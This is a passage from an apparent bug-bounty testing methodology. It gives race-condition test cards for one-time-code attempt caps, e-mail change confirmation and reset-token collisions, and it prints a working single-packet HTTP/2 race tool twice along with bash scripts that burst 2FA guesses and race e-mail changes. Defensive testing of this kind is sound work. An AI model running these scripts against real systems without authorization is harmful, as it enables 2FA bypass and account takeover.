  grep -l '"access_token"' "$D"/burst-code/*.txt | wc -l
  # 6. one invitation from A's workspace accepted by B twenty times in one packet; A removes B once; is B still in?
  python3 "$E/tools/race.py" "${HDR[@]}" $B -n 20 -- POST "$T/api/invitations/<token of A's invitation to B>/accept" | tee "$D/burst-accept.txt"
  curl -sS "${HDR[@]}" $A "$T/api/team/members" | grep -o '<B e-mail>' | wc -l          # more than one membership row?
  curl -sS "${HDR[@]}" $A -X DELETE "$T/api/team/members/<B member id>" -o /dev/null -w 'remove B once: %{http_code}\n'
  curl -sS "${HDR[@]}" $B "$T/api/workspaces/<A workspace id>" -o /dev/null -w 'B after the removal: %{http_code}\n'
  # delete every extra object and invitation; list them in cleanup.md
  ```
- **Proof:** the account's own usage view or list showing more objects than the plan allows: the refusal at the
  limit, the burst output, the list after, and one write to an extra object that succeeds (it is usable, not
  merely stored); or a count on our own object moved by more than one for one account; or several access tokens
  from one authorization code that all still work; or B still reaching A's workspace after one removal because the
  burst created several memberships. With the rate over the runs.
- **Not a finding when:** the limit is soft by design (overage billed, a documented grace), and a limit the
  programme itself calls soft earns little even when fixed (#395351, $100); the extras exist but are locked,
  flagged or removed by a background job; the count is a cache that corrects itself; votes and likes whose count changes nothing (Graveyard); the
  policy excludes plan-limit races, as Shopify's note on #413759 does; tokens from one code that the server
  revokes once it sees the reuse, which is what RFC 6749 §4.1.2 asks for.
- **Escalate:** the sequential forms (pending invitations, duplicate, restore, bulk create) are BIZ-011. Pending
  security requests created in one packet are the stronger form: several 2FA-reset or account-deletion requests,
  of which the owner's "cancel" removes only one (#2598548); test it on our own account and report the bypass,
  not the count. A membership that survives its removal is BAC-017's impact reached by a race; an invitation
  redeemed into the wrong account or tenant is BAC-015.

### RAC-005 · The one-time-code attempt cap is checked before failures are counted, so one packet of thirty guesses is evaluated in full

| | |
|---|---|
| **Severity** | High standalone for a login or password-reset code (the code space becomes reachable; takeover by identifier once the arithmetic is shown); Medium for a second-factor code, where the password is also needed |
| **Requires** | mfa\|password-reset, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Restriction of Authentication Attempts · CWE-307, CWE-362 |
| **Prior art** | #2598548, #67562, #407971 |

- **Where:** any check of a short code that states a cap on failures: the 2FA challenge, an e-mailed or SMS login
  code, a password-reset code, a phone or e-mail verification code, a recovery PIN, a captcha that appears after N
  failures. The session at the code step comes from the password step of our own account A (TOTP: `oathtool`;
  mailed codes: A's mailbox). The library has no disclosed report of a raced attempt counter under that name;
  #2598548 (a 2FA reset race) and #67562 (a captcha and a race) are the nearest, and #407971 shows what a reachable
  code space was worth.
- **Test:** the check reads the failure count, compares the code, then increments the count. Guesses that read the
  count before the first increment are all evaluated. Measure the cap one guess per second, wait for the lock to
  clear, then release 29 wrong codes and the right one in one packet. More "wrong code" answers than the cap
  allows, or the right code accepted at the end, means the counter was raced.
- **How:** the first block is the same in every RAC card; the second holds this card's steps, with the saved
  requests in place of the example paths.
  ```bash
  # 0. race.py and sessions(): this block is the same in every RAC card; race.py is written once per engagement
  mkdir -p "$E/tools"; [ -s "$E/tools/race.py" ] || cat > "$E/tools/race.py" <<'PY'
  # race.py: release up to 50 requests together and print what each returned (needs: python3 -m pip install --user h2).
  # HTTP/2 (default) is the single-packet attack: all requests go out but their last byte, a PING round trip shows the server
  # has read them, then every last byte leaves in one write. --h1 is last-byte sync: one connection per request.
  # race.py [-n 20] [--h1] [--warm PATH] [--stagger MS] [--each FILE] [--out DIR] [-k] [curl -A/-H args] -- [COUNT] METHOD URL [BODY|@file] [-- ...]
  # Templates without COUNT repeat in turn up to -n; {i} (URL, body, header) is the request number; --each gives request i the header on line i
  # of FILE (a session per request); --stagger releases them MS ms apart. Afterwards it sleeps n/$RATE s for the rate limit.
  import os, re, socket, ssl, sys, threading, time
  from collections import Counter
  from urllib import parse
  a, o, fl, hd = sys.argv[1:], {'-n': '20', '--warm': '', '--stagger': '0', '--each': '', '--out': '', '--timeout': '20'}, set(), []
  while a and a[0] != '--':
      k = a.pop(0)
      if k in ('--h1', '-k'): fl.add(k); continue
      if k not in o and k not in ('-A', '-H'): sys.exit('race.py: unknown option ' + k)
      v = a.pop(0)
      if k in o: o[k] = v; continue
      for ln in ['User-Agent: ' + v] if k == '-A' else open(v[1:]).read().splitlines() if v[:1] == '@' else [v]:
          n, _, w = ln.partition(':')
          if n.strip() and w.strip(): hd.append((n.strip().lower(), w.strip()))
  tpl, cnt = [t.split('\0') for t in '\0'.join(a[1:]).split('\0--\0') if t], lambda t: int(t[0]) if t[0].isdigit() else 0
  seq = [t[1:] if cnt(t) else t for t in tpl for _ in range(cnt(t) or 1)] if any(map(cnt, tpl)) else [tpl[i % len(tpl)] for i in range(int(o['-n']) * bool(tpl))]
  if not 0 < len(seq) <= 50: sys.exit('race.py: give 1 to 50 requests after --; more is load, not a race')
  each, R = [x for x in open(o['--each']) if ':' in x] if o['--each'] else [], []
  DROP = {'host', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 'upgrade', 'te', 'content-length'}
  for i, t in enumerate(seq):
      b, h = t[2] if len(t) > 2 else '', list(hd)
      b = (open(b[1:], 'rb').read() if b[:1] == '@' else b.encode()).replace(b'{i}', str(i).encode())
      if each: n, _, w = each[i % len(each)].partition(':'); h = [x for x in h if x[0] != n.strip().lower()] + [(n.strip().lower(), w.strip())]
      R.append((t[0].upper(), parse.urlsplit(t[1].replace('{i}', str(i))), [(k, v.replace('{i}', str(i))) for k, v in h if k not in DROP], b))
  u0, N, res = R[0][1], len(R), [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in R]
  if any(r[1][:2] != u0[:2] for r in R): sys.exit('race.py: all requests must go to one origin')
  TLS, TO, RATE, GAP = (u0.scheme == 'https'), float(o['--timeout']), float(os.environ.get('RATE') or 1), float(o['--stagger']) / 1000
  def path(u): return (u[2] or '/') + ('?' + u[3] if u[3] else '')  # path and query of a split URL
  def conn(alpn):
      s = socket.create_connection((u0.hostname, (u0.port or (443 if TLS else 80))), timeout=TO)
      s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      if not TLS: return s
      cx = ssl.create_default_context(); cx.set_alpn_protocols([alpn])
      if '-k' in fl: cx.check_hostname, cx.verify_mode = False, ssl.CERT_NONE
      return cx.wrap_socket(s, server_hostname=u0.hostname)
  def h2run():
      from h2 import config, connection, events as ev
      s = conn('h2')
      if TLS and s.selected_alpn_protocol() != 'h2': sys.exit('race.py: the server did not negotiate HTTP/2: use --h1')
      c = connection.H2Connection(config.H2Configuration(client_side=True, header_encoding='utf-8'))
      c.initiate_connection(); s.sendall(c.data_to_send()); rec, flag = {}, set()
      def pump(done, limit):
          end = time.time() + limit
          while not done() and time.time() < end and 'gone' not in flag:
              s.settimeout(max(0.05, end - time.time()))
              try: data = s.recv(65536)
              except (socket.timeout, TimeoutError): break
              if not data: flag.add('gone'); break
              for e in c.receive_data(data):
                  r = rec.get(getattr(e, 'stream_id', None))
                  if isinstance(e, ev.ResponseReceived) and r: r.update(t1=time.time(), hd=e.headers, st=dict(e.headers)[':status'])
                  elif isinstance(e, ev.DataReceived):
                      if r: r['body'] += bytes(e.data)
                      c.acknowledge_received_data(e.flow_controlled_length, e.stream_id)
                  elif isinstance(e, ev.StreamEnded) and r: r['t2'] = time.time()
                  elif isinstance(e, ev.StreamReset) and r: r.update(t2=time.time(), st='RST')
                  elif isinstance(e, ev.PingAckReceived): flag.add('pong')
                  elif isinstance(e, ev.RemoteSettingsChanged): flag.add('settings')
                  elif isinstance(e, ev.ConnectionTerminated): flag.add('gone')
              s.sendall(c.data_to_send())
      def start(m, u, h, b, r, end=False):
          sid, cl = c.get_next_available_stream_id(), [('content-length', str(len(b)))] if b or m in ('POST', 'PUT', 'PATCH') else []
          rec[sid] = r; c.send_headers(sid, [(':method', m), (':authority', u.netloc), (':scheme', u.scheme), (':path', path(u))] + h + cl, end_stream=end)
          return sid
      def data(sid, b, end):
          mx = c.max_outbound_frame_size; ch = [b[j:j + mx] for j in range(0, len(b), mx)] or [b'']
          for j, x in enumerate(ch):
              if x or end: c.send_data(sid, x, end_stream=end and j == len(ch) - 1)
      pump(lambda: 'settings' in flag, 5)
      if 'settings' not in flag: sys.exit('race.py: no HTTP/2 SETTINGS frame from the server: use --h1')
      if o['--warm']:  # three GETs on this connection first, so that the burst does not pay for a cold connection
          w = [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in range(3)]
          for r in w: start('GET', u0._replace(path=o['--warm'], query=''), [x for x in hd if x[0] not in DROP], b'', r, True)
          s.sendall(c.data_to_send()); pump(lambda: all(r['t2'] for r in w), TO)
      if sum(len(x[3]) for x in R) > 60000: sys.exit('race.py: the bodies exceed one flow-control window: keep them small')
      sids = [start(*x, r) for x, r in zip(R, res)]
      for sid, x in zip(sids, R): data(sid, x[3][:-1], False)
      s.sendall(c.data_to_send()); c.ping(b'race.py!'); s.sendall(c.data_to_send()); pump(lambda: 'pong' in flag, 5)
      last = []
      for sid, x in zip(sids, R): data(sid, x[3][-1:], True); last.append(c.data_to_send())
      if GAP:
          for q, r in zip(last, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      else:
          t0 = time.time(); s.sendall(b''.join(last))
          for r in res: r['t0'] = t0
      pump(lambda: all(r['t2'] for r in res), TO)
  def h1run():
      def rd(s, r):
          buf = b''
          while True:
              try: x = s.recv(65536)
              except OSError: break
              if not x: break
              buf, r['t1'] = buf + x, r['t1'] or time.time()
          head, _, r['body'] = buf.partition(b'\r\n\r\n'); ln = head.decode('latin-1').split('\r\n')
          r.update(t2=time.time(), st=(ln[0].split(' ') + ['-', '-'])[1], hd=[tuple(x.split(': ', 1)) for x in ln[1:] if ': ' in x])
      socks = []
      for m, u, h, b in R:
          ln = ['%s %s HTTP/1.1' % (m, path(u)), 'host: ' + u.netloc] + ['%s: %s' % x for x in h] + ['connection: close']
          q = ('\r\n'.join(ln + (['content-length: %d' % len(b)] if b or m in ('POST', 'PUT', 'PATCH') else [])) + '\r\n\r\n').encode() + b
          s = conn('http/1.1'); s.sendall(q[:-1]); socks.append((s, q[-1:]))
      th = [threading.Thread(target=rd, args=(s, r)) for (s, _), r in zip(socks, res)]
      for t in th: t.start()
      time.sleep(0.3)  # HTTP/1.1 has no PING: give the partial requests time to arrive
      for (s, q), r in zip(socks, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      for t in th: t.join(TO)
  h1run() if '--h1' in fl else h2run()
  print('# %d requests released %s over %s, %s' % (N, '%s ms apart' % o['--stagger'] if GAP else 'together', 'HTTP/1.1' if '--h1' in fl else 'HTTP/2', time.strftime('%H:%M:%S')))
  seen = Counter()
  for i, ((m, u, h, b), r) in enumerate(zip(R, res)):
      snip, ms = re.sub(r'\s+', ' ', r['body'][:100].decode('utf-8', 'replace')), '%8.1f' % ((r['t1'] - r['t0']) * 1000) if r['t1'] else '       -'
      print('%3d %-4s %7d %s ms  %s %s  %s' % (i, r['st'], len(r['body']), ms, m, path(u)[:40], snip[:70]))
      seen[(r['st'], re.sub(r'[0-9a-f]{8,}|\d+', '#', snip[:60]))] += 1
      if o['--out']:
          os.makedirs(o['--out'], exist_ok=True); hh = ''.join('%s: %s\n' % x for x in r['hd'])
          open(os.path.join(o['--out'], '%02d.txt' % i), 'wb').write(('%s %s\n' % (m, u.geturl())).encode() + b + ('\n\n%s\n%s\n' % (r['st'], hh)).encode() + r['body'])
  print('# outcomes (digits and hex ids folded):')
  for k, v in seen.most_common(): print('%5d x %-4s %s' % (v, k[0], k[1]))
  print('# ms from release to first response byte, sorted: ' + ' '.join('%.0f' % x for x in sorted((r['t1'] - r['t0']) * 1000 for r in res if r['t1'])))
  time.sleep(N / RATE)
  PY
  # sessions FILE PATH BODY: twenty logins with the saved login request, one Cookie line per session, for race.py --each FILE
  sessions(){ for i in $(seq 1 20); do curl -sS "${HDR[@]}" -c "$1.jar" -o /dev/null -X POST "$T$2" -H "Content-Type: ${LOGIN_CT:-application/json}" -d "$3"
    printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$1.jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')"; rm -f "$1.jar"; sleep 1; done > "$1"; }
  ```
  ```bash
  D="$E/evidence/$H/RAC-005"; mkdir -p "$D"; CT='Content-Type: application/json'
  EA='<A e-mail>'; PA='<A password>'; SA='<A TOTP secret, base32>'
  # the session that waits at the code step: the password step only, its cookies saved as a header file
  pw(){ curl -sS "${HDR[@]}" -c "$D/jar" -o /dev/null -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$EA\",\"password\":\"$PA\"}"
        printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$D/jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')" > "$D/pre2fa.headers"; }
  try(){ curl -sS "${HDR[@]}" -H @"$D/pre2fa.headers" -X POST "$T/api/2fa/verify" -H "$CT" -d "{\"code\":\"$1\"}" -o "$D/last.body" -w '%{http_code} %{size_download}'; }
  # 1. the cap, one guess per second: wrong codes until the answer changes; then the right code, which a lock must refuse
  pw; GOOD=$(oathtool --totp -b "$SA"); BAD=$(printf '%06d' $(( (10#$GOOD + 500000) % 1000000 )))
  for i in $(seq 1 10); do echo "wrong $i: $(try "$BAD")"; sleep 1; done | tee "$D/cap.txt"
  echo "right code after the wrong ones: $(try "$(oathtool --totp -b "$SA")")" | tee -a "$D/cap.txt"
  # 2. once the lock has cleared: 29 wrong codes and the right one in one packet, all in one fresh pre-2FA session
  #    (--h1 without HTTP/2)
  #    after a session lock in RAC-001, one pre-2FA session per guess: for i in $(seq 1 30); do pw; cat "$D/pre2fa.headers";
  #    sleep 1; done > "$D/pre2fa-each.txt", then add --each "$D/pre2fa-each.txt" (TOTP only: a mailed code changes per login)
  pw; GOOD=$(oathtool --totp -b "$SA"); BAD=$(printf '%06d' $(( (10#$GOOD + 500000) % 1000000 )))
  python3 "$E/tools/race.py" "${HDR[@]}" -H @"$D/pre2fa.headers" -H "$CT" --out "$D/burst-1" \
    -- 29 POST "$T/api/2fa/verify" "{\"code\":\"$BAD\"}" -- 1 POST "$T/api/2fa/verify" "{\"code\":\"$GOOD\"}" | tee "$D/burst-1.txt"
  curl -sS "${HDR[@]}" -H @"$D/pre2fa.headers" "$T/api/me" -o "$D/me-after.json" -w 'session after the burst: %{http_code}\n'
  # 3. the rate: up to three bursts, each on a fresh code and a fresh pre-2FA session. For a mailed or SMS code, request it,
  #    read it from A's mailbox into GOOD, and use the code-entry request of that flow in place of /api/2fa/verify
  ```
- **Proof:** the sequential control (the cap L: L wrong answers, then the lock, and the right code refused while
  locked) beside the burst (more than L codes evaluated, and the right code, sent last, accepted with a session for
  A), the rate over the bursts, and the arithmetic, not run: P guesses per packet instead of L against a space of S
  codes, so each issued code falls with probability about P/S per packet and an attacker expects S/P packets.
  Our own account only, one packet per issued code.
- **Not a finding when:** the burst answers "locked" after L and the right code is refused (the counter is atomic);
  the right code is accepted only when it is among the first L (the server took them in order); every answer is
  the same because a limiter in front refused the burst (`429`, a challenge page): measure the limiter, never push
  through it; a cap kept per session or per IP address is a limiter keyed on the client (AUT-010), not a race;
  the code is long enough that S/P is years. A programme that excludes `rate-limit` usually still accepts a raced
  cap on an authentication factor when the arithmetic is shown; read its policy text.
- **Escalate:** with `bruteforce-ok`, AUT-008's stage 2, sent in packets at the engagement rate, turns this into
  takeover of our own account by code. AUT-010 (a limiter keyed on a client value) and GQL-007 (alias batching)
  are other ways past the counter. The login sub-state: where the session identifier from before the password
  step survives login (AUT-016), release the password step together with ten authenticated reads in that session;
  a read answered as A before any code was entered means the application stores the user in the session a moment
  before it stores "second factor required".

### RAC-006 · Two e-mail changes released in one packet make the confirmation sent to one address confirm the other

| | |
|---|---|
| **Severity** | High standalone when the account ends up verified for an address whose mailbox was never opened and something trusts that address (SSO, domain auto-join, invitations by address); Medium when the verified state only unlocks features; Critical when the address match hands over another account or tenant |
| **Requires** | email-out, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Time-of-check Time-of-use (TOCTOU) Race Condition · CWE-367 |
| **Prior art** | #300305, #3020733 |

- **Where:** the e-mail change (the profile update or the settings form), "add a secondary e-mail", the
  confirmation link and its resend, and flows that send a request to an address for its owner to accept
  (#300305: a partner requesting access to a store). X is an address we read; Y is a second address of ours, at
  our own domain, whose mailbox stays closed for the whole test. Never a third party's address: the test mails it.
- **Test:** the change handler stores the pending address and the confirmation token in separate writes, and the
  mailer reads the record a moment later. Two changes released together, to X and to Y, can mail X a token that
  confirms Y. In the second form, a confirmation for X released together with a change to Y applies whatever
  pending address the confirm handler reads at that moment.
- **How:** the first block is the same in every RAC card; the second holds this card's steps, with the saved
  requests in place of the example paths.
  ```bash
  # 0. race.py and sessions(): this block is the same in every RAC card; race.py is written once per engagement
  mkdir -p "$E/tools"; [ -s "$E/tools/race.py" ] || cat > "$E/tools/race.py" <<'PY'
  # race.py: release up to 50 requests together and print what each returned (needs: python3 -m pip install --user h2).
  # HTTP/2 (default) is the single-packet attack: all requests go out but their last byte, a PING round trip shows the server
  # has read them, then every last byte leaves in one write. --h1 is last-byte sync: one connection per request.
  # race.py [-n 20] [--h1] [--warm PATH] [--stagger MS] [--each FILE] [--out DIR] [-k] [curl -A/-H args] -- [COUNT] METHOD URL [BODY|@file] [-- ...]
  # Templates without COUNT repeat in turn up to -n; {i} (URL, body, header) is the request number; --each gives request i the header on line i
  # of FILE (a session per request); --stagger releases them MS ms apart. Afterwards it sleeps n/$RATE s for the rate limit.
  import os, re, socket, ssl, sys, threading, time
  from collections import Counter
  from urllib import parse
  a, o, fl, hd = sys.argv[1:], {'-n': '20', '--warm': '', '--stagger': '0', '--each': '', '--out': '', '--timeout': '20'}, set(), []
  while a and a[0] != '--':
      k = a.pop(0)
      if k in ('--h1', '-k'): fl.add(k); continue
      if k not in o and k not in ('-A', '-H'): sys.exit('race.py: unknown option ' + k)
      v = a.pop(0)
      if k in o: o[k] = v; continue
      for ln in ['User-Agent: ' + v] if k == '-A' else open(v[1:]).read().splitlines() if v[:1] == '@' else [v]:
          n, _, w = ln.partition(':')
          if n.strip() and w.strip(): hd.append((n.strip().lower(), w.strip()))
  tpl, cnt = [t.split('\0') for t in '\0'.join(a[1:]).split('\0--\0') if t], lambda t: int(t[0]) if t[0].isdigit() else 0
  seq = [t[1:] if cnt(t) else t for t in tpl for _ in range(cnt(t) or 1)] if any(map(cnt, tpl)) else [tpl[i % len(tpl)] for i in range(int(o['-n']) * bool(tpl))]
  if not 0 < len(seq) <= 50: sys.exit('race.py: give 1 to 50 requests after --; more is load, not a race')
  each, R = [x for x in open(o['--each']) if ':' in x] if o['--each'] else [], []
  DROP = {'host', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 'upgrade', 'te', 'content-length'}
  for i, t in enumerate(seq):
      b, h = t[2] if len(t) > 2 else '', list(hd)
      b = (open(b[1:], 'rb').read() if b[:1] == '@' else b.encode()).replace(b'{i}', str(i).encode())
      if each: n, _, w = each[i % len(each)].partition(':'); h = [x for x in h if x[0] != n.strip().lower()] + [(n.strip().lower(), w.strip())]
      R.append((t[0].upper(), parse.urlsplit(t[1].replace('{i}', str(i))), [(k, v.replace('{i}', str(i))) for k, v in h if k not in DROP], b))
  u0, N, res = R[0][1], len(R), [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in R]
  if any(r[1][:2] != u0[:2] for r in R): sys.exit('race.py: all requests must go to one origin')
  TLS, TO, RATE, GAP = (u0.scheme == 'https'), float(o['--timeout']), float(os.environ.get('RATE') or 1), float(o['--stagger']) / 1000
  def path(u): return (u[2] or '/') + ('?' + u[3] if u[3] else '')  # path and query of a split URL
  def conn(alpn):
      s = socket.create_connection((u0.hostname, (u0.port or (443 if TLS else 80))), timeout=TO)
      s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      if not TLS: return s
      cx = ssl.create_default_context(); cx.set_alpn_protocols([alpn])
      if '-k' in fl: cx.check_hostname, cx.verify_mode = False, ssl.CERT_NONE
      return cx.wrap_socket(s, server_hostname=u0.hostname)
  def h2run():
      from h2 import config, connection, events as ev
      s = conn('h2')
      if TLS and s.selected_alpn_protocol() != 'h2': sys.exit('race.py: the server did not negotiate HTTP/2: use --h1')
      c = connection.H2Connection(config.H2Configuration(client_side=True, header_encoding='utf-8'))
      c.initiate_connection(); s.sendall(c.data_to_send()); rec, flag = {}, set()
      def pump(done, limit):
          end = time.time() + limit
          while not done() and time.time() < end and 'gone' not in flag:
              s.settimeout(max(0.05, end - time.time()))
              try: data = s.recv(65536)
              except (socket.timeout, TimeoutError): break
              if not data: flag.add('gone'); break
              for e in c.receive_data(data):
                  r = rec.get(getattr(e, 'stream_id', None))
                  if isinstance(e, ev.ResponseReceived) and r: r.update(t1=time.time(), hd=e.headers, st=dict(e.headers)[':status'])
                  elif isinstance(e, ev.DataReceived):
                      if r: r['body'] += bytes(e.data)
                      c.acknowledge_received_data(e.flow_controlled_length, e.stream_id)
                  elif isinstance(e, ev.StreamEnded) and r: r['t2'] = time.time()
                  elif isinstance(e, ev.StreamReset) and r: r.update(t2=time.time(), st='RST')
                  elif isinstance(e, ev.PingAckReceived): flag.add('pong')
                  elif isinstance(e, ev.RemoteSettingsChanged): flag.add('settings')
                  elif isinstance(e, ev.ConnectionTerminated): flag.add('gone')
              s.sendall(c.data_to_send())
      def start(m, u, h, b, r, end=False):
          sid, cl = c.get_next_available_stream_id(), [('content-length', str(len(b)))] if b or m in ('POST', 'PUT', 'PATCH') else []
          rec[sid] = r; c.send_headers(sid, [(':method', m), (':authority', u.netloc), (':scheme', u.scheme), (':path', path(u))] + h + cl, end_stream=end)
          return sid
      def data(sid, b, end):
          mx = c.max_outbound_frame_size; ch = [b[j:j + mx] for j in range(0, len(b), mx)] or [b'']
          for j, x in enumerate(ch):
              if x or end: c.send_data(sid, x, end_stream=end and j == len(ch) - 1)
      pump(lambda: 'settings' in flag, 5)
      if 'settings' not in flag: sys.exit('race.py: no HTTP/2 SETTINGS frame from the server: use --h1')
      if o['--warm']:  # three GETs on this connection first, so that the burst does not pay for a cold connection
          w = [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in range(3)]
          for r in w: start('GET', u0._replace(path=o['--warm'], query=''), [x for x in hd if x[0] not in DROP], b'', r, True)
          s.sendall(c.data_to_send()); pump(lambda: all(r['t2'] for r in w), TO)
      if sum(len(x[3]) for x in R) > 60000: sys.exit('race.py: the bodies exceed one flow-control window: keep them small')
      sids = [start(*x, r) for x, r in zip(R, res)]
      for sid, x in zip(sids, R): data(sid, x[3][:-1], False)
      s.sendall(c.data_to_send()); c.ping(b'race.py!'); s.sendall(c.data_to_send()); pump(lambda: 'pong' in flag, 5)
      last = []
      for sid, x in zip(sids, R): data(sid, x[3][-1:], True); last.append(c.data_to_send())
      if GAP:
          for q, r in zip(last, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      else:
          t0 = time.time(); s.sendall(b''.join(last))
          for r in res: r['t0'] = t0
      pump(lambda: all(r['t2'] for r in res), TO)
  def h1run():
      def rd(s, r):
          buf = b''
          while True:
              try: x = s.recv(65536)
              except OSError: break
              if not x: break
              buf, r['t1'] = buf + x, r['t1'] or time.time()
          head, _, r['body'] = buf.partition(b'\r\n\r\n'); ln = head.decode('latin-1').split('\r\n')
          r.update(t2=time.time(), st=(ln[0].split(' ') + ['-', '-'])[1], hd=[tuple(x.split(': ', 1)) for x in ln[1:] if ': ' in x])
      socks = []
      for m, u, h, b in R:
          ln = ['%s %s HTTP/1.1' % (m, path(u)), 'host: ' + u.netloc] + ['%s: %s' % x for x in h] + ['connection: close']
          q = ('\r\n'.join(ln + (['content-length: %d' % len(b)] if b or m in ('POST', 'PUT', 'PATCH') else [])) + '\r\n\r\n').encode() + b
          s = conn('http/1.1'); s.sendall(q[:-1]); socks.append((s, q[-1:]))
      th = [threading.Thread(target=rd, args=(s, r)) for (s, _), r in zip(socks, res)]
      for t in th: t.start()
      time.sleep(0.3)  # HTTP/1.1 has no PING: give the partial requests time to arrive
      for (s, q), r in zip(socks, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      for t in th: t.join(TO)
  h1run() if '--h1' in fl else h2run()
  print('# %d requests released %s over %s, %s' % (N, '%s ms apart' % o['--stagger'] if GAP else 'together', 'HTTP/1.1' if '--h1' in fl else 'HTTP/2', time.strftime('%H:%M:%S')))
  seen = Counter()
  for i, ((m, u, h, b), r) in enumerate(zip(R, res)):
      snip, ms = re.sub(r'\s+', ' ', r['body'][:100].decode('utf-8', 'replace')), '%8.1f' % ((r['t1'] - r['t0']) * 1000) if r['t1'] else '       -'
      print('%3d %-4s %7d %s ms  %s %s  %s' % (i, r['st'], len(r['body']), ms, m, path(u)[:40], snip[:70]))
      seen[(r['st'], re.sub(r'[0-9a-f]{8,}|\d+', '#', snip[:60]))] += 1
      if o['--out']:
          os.makedirs(o['--out'], exist_ok=True); hh = ''.join('%s: %s\n' % x for x in r['hd'])
          open(os.path.join(o['--out'], '%02d.txt' % i), 'wb').write(('%s %s\n' % (m, u.geturl())).encode() + b + ('\n\n%s\n%s\n' % (r['st'], hh)).encode() + r['body'])
  print('# outcomes (digits and hex ids folded):')
  for k, v in seen.most_common(): print('%5d x %-4s %s' % (v, k[0], k[1]))
  print('# ms from release to first response byte, sorted: ' + ' '.join('%.0f' % x for x in sorted((r['t1'] - r['t0']) * 1000 for r in res if r['t1'])))
  time.sleep(N / RATE)
  PY
  # sessions FILE PATH BODY: twenty logins with the saved login request, one Cookie line per session, for race.py --each FILE
  sessions(){ for i in $(seq 1 20); do curl -sS "${HDR[@]}" -c "$1.jar" -o /dev/null -X POST "$T$2" -H "Content-Type: ${LOGIN_CT:-application/json}" -d "$3"
    printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$1.jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')"; rm -f "$1.jar"; sleep 1; done > "$1"; }
  ```
  ```bash
  D="$E/evidence/$H/RAC-006"; mkdir -p "$D/mail"; CT='Content-Type: application/json'
  X='<address we read>'; Y='<second address of ours, at our domain; its mailbox stays closed>'; ORIG='<A original e-mail>'
  st(){ echo "$1: $(curl -sS "${HDR[@]}" $A "$T/api/me" | grep -oE '"(email|email_verified|verified|unconfirmed_email|pending_email)":[^,}]*' | tr '\n' ' ')"; }
  st 0-before
  # 1. twenty changes in one packet, X and Y alternating (--each after a session lock in RAC-001; --h1 without HTTP/2)
  python3 "$E/tools/race.py" "${HDR[@]}" $A -H "$CT" -n 20 --out "$D/burst-1" \
    -- PATCH "$T/api/me" "{\"email\":\"$X\"}" -- PATCH "$T/api/me" "{\"email\":\"$Y\"}" | tee "$D/burst-1.txt"
  st 1-after-burst
  # save every message X received as raw .eml in $D/mail/, then list the confirmation links on the target's host
  grep -hoE "https?://$H/[^\" <>]*(confirm|verif|token)[^\" <>]*" "$D"/mail/*.eml | sort -u | tee "$D/links.txt"
  grep -hiE '^(to|date|subject):' "$D"/mail/*.eml
  # open each link once in A's session (a tracking redirect in the mail: open the final target-host URL instead)
  while read -r L; do curl -sS "${HDR[@]}" $A -o /dev/null -w "%{http_code} $L\n" "$L"; st after-link; sleep 1; done < "$D/links.txt"
  # 2. a confirmation for X released together with a change to Y
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/me" -H "$CT" -d "{\"email\":\"$X\"}" -o /dev/null -w 'change to X: %{http_code}\n'
  TX='<token from the newest mail to X>'
  python3 "$E/tools/race.py" "${HDR[@]}" $A -H "$CT" \
    -- 1 GET "$T/confirm-email?token=$TX" -- 1 PATCH "$T/api/me" "{\"email\":\"$Y\"}" | tee "$D/burst-2.txt"
  st 2-after-confirm-race
  # 3. restore the original address
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/me" -H "$CT" -d "{\"email\":\"$ORIG\"}" -o /dev/null -w 'restore: %{http_code}\n'
  ```
- **Proof:** A's profile showing Y as its verified address, the raw mail that did it (delivered to X, with the link
  inside), Y's mailbox shown unopened, and the consequence where something trusts Y: an organisation that admits
  Y's domain, an invitation addressed to Y, an SSO identity asserted for Y. With the rate over the runs.
- **Not a finding when:** the link encodes the address it was issued for and the confirm handler checks it (the
  mail to X confirms X only); the mail to X carries X's token and only the last change stays pending; Y ends
  "pending", not verified; Y was verified because its own link was opened; the change also needs approval from the
  old address and that never happened; Y verified with nothing that trusts it: #3020733, an e-mail verification
  bypass through a race, was closed as informative.
- **Escalate:** a verified Y at a domain our second tenant admits automatically, or with a pending invitation, is
  cross-tenant access (BAC chapter); relying parties that trust the verified e-mail are the OAU chapter; the
  sequential forms are AUT-014 and BIZ-015. If Y already belongs to B (ours), check whether A's verified Y detaches
  it from B or redirects B's reset mail.

### RAC-007 · A reset or login token mailed to account A also works for account B when both are requested in one packet

| | |
|---|---|
| **Severity** | Critical standalone when a token mailed to A resets or signs in B (takeover with the e-mail address alone; High, `AC:H`, when the collision needs many bursts); Medium when tokens repeat only within one account |
| **Requires** | email-out, two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Use of Insufficiently Random Values · CWE-330, CWE-362 |
| **Prior art** | #2142109, #1293377 |

- **Where:** forgot-password, e-mailed login links and codes, verification resends, invitations: any request that
  mints a token and mails it. Tokens that look derived from time are the best candidates: hex strings that share a
  prefix across requests, values that sort by issue time, the 13 hex digits of PHP's `uniqid()`, UUID version 1
